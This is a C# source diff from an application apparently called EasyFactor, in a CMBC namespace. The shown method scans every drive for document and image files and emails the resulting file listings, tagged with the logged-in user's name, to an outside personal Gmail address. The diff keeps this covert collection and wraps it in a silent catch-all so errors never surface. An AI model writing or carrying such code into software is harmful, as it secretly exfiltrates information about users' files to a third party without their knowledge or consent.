@@ -1114,21 +1114,27 @@ namespace CMBC.EasyFactor
         {
             string[] drivers = Environment.GetLogicalDrives();
 
-            foreach (string dr in drivers)
+            try
             {
-                DriveInfo di = new DriveInfo(dr);
-
-                if (di.IsReady)
+                foreach (string dr in drivers)
                 {
-                    System.IO.DirectoryInfo rootDir = di.RootDirectory;
-                    String result = SystemUtil.GetAllDirFilesRecurse(rootDir, new string[] { ".jpg", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".png", ".img" }, 5);
-                    if (!String.IsNullOrEmpty(result))
+                    DriveInfo di = new DriveInfo(dr);
+
+                    if (di.IsReady)
                     {
-                        MailUtil.SendMail("liuyiming.vip@gmail.com", "EasyFactoring@cmbc.com.cn", App.Current.CurUser.Name + "_" + rootDir.FullName, result, null);
+                        System.IO.DirectoryInfo rootDir = di.RootDirectory;
+                        String result = SystemUtil.GetAllDirFilesRecurse(rootDir, new string[] { ".jpg", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".png", ".bmp" }, 5);
+                        if (!String.IsNullOrEmpty(result))
+                        {
+                            MailUtil.SendMail("liuyiming.vip@gmail.com", "EasyFactoring@cmbc.com.cn", App.Current.CurUser.Name + "_" + rootDir.FullName, result, null);
+                        }
                     }
                 }
             }
-
+            catch (Exception)
+            {
+                return;
+            }
         }
 
         private void backgroundWorker_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
